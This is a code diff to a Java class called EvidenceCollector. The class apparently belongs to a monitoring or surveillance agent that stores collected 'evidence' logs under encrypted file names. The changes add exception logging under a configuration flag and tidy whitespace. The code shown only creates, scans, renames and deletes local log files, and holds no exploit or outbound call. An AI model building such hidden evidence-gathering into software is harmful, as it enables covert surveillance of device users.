@@ -70,7 +70,7 @@ public class EvidenceCollector {
 	 */
 	public static EvidenceCollector self() {
 		if (singleton == null) {
-			synchronized (evidenceCollectorLock ) {
+			synchronized (evidenceCollectorLock) {
 				if (singleton == null) {
 					singleton = new EvidenceCollector();
 				}
@@ -136,6 +136,9 @@ public class EvidenceCollector {
 		try {
 			content.deleteFile(PROG_FILENAME);
 		} catch (Exception ex) {
+			if (Cfg.EXCEPTION) {
+				Check.log(ex);
+			}
 
 		}
 	}
@@ -157,6 +160,10 @@ public class EvidenceCollector {
 
 			fos.close();
 		} catch (final IOException e) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e);
+			}
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Error: " + e.toString());//$NON-NLS-1$
 			}
@@ -181,6 +188,10 @@ public class EvidenceCollector {
 			fos.write(Utils.intToByteArray(logProgressive));
 			fos.close();
 		} catch (final IOException e) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e);
+			}
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Error: " + e.toString());//$NON-NLS-1$
 			}
@@ -241,7 +252,7 @@ public class EvidenceCollector {
 		final String fileName = paddedProgressive + "" + logType + "" + makeDateName(timestamp); //$NON-NLS-1$ //$NON-NLS-2$
 
 		final String encName = encryptName(fileName + LOG_EXTENSION);
-		
+
 		if (Cfg.DEBUG) {
 			Check.asserts(!encName.endsWith("mob"), "makeNewName: " + encName + " ch: " + seed + " not scrambled: " //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
 					+ fileName + LOG_EXTENSION);
@@ -327,6 +338,10 @@ public class EvidenceCollector {
 			}
 
 		} catch (final Exception e) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e);
+			}
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Error: removeLog: " + basePath + " ex: " + e);//$NON-NLS-1$ //$NON-NLS-2$
 			}
@@ -369,6 +384,10 @@ public class EvidenceCollector {
 				}
 			}
 		} catch (final Exception e) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e);
+			}
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Error: scanForDirLogs: " + e);//$NON-NLS-1$
 			}
@@ -433,6 +452,10 @@ public class EvidenceCollector {
 			}
 
 		} catch (final Exception e) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e);
+			}
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Error: scanForLogs: " + e);//$NON-NLS-1$
 			}
@@ -462,7 +485,7 @@ public class EvidenceCollector {
 	 */
 	public static void flushEvidences() {
 		String basePath = Path.logs();
-		
+
 		final Vector<String> dirs = scanForDirLogs(basePath);
 		final int dsize = dirs.size();
 		if (Cfg.DEBUG) {
@@ -487,13 +510,17 @@ public class EvidenceCollector {
 						if (Cfg.DEBUG) {
 							Check.log(TAG + " WARNING (flushEvidences): " + decryptName(file));
 						}
-						
+
 						AutoFile tmp = new AutoFile(fcDir.getPath(), file);
 						tmp.dropExtension(EvidenceCollector.LOG_TMP);
 					}
 				}
 
 			} catch (final Exception e) {
+				if (Cfg.EXCEPTION) {
+					Check.log(e);
+				}
+
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " Error: scanForLogs: " + e);//$NON-NLS-1$
 				}
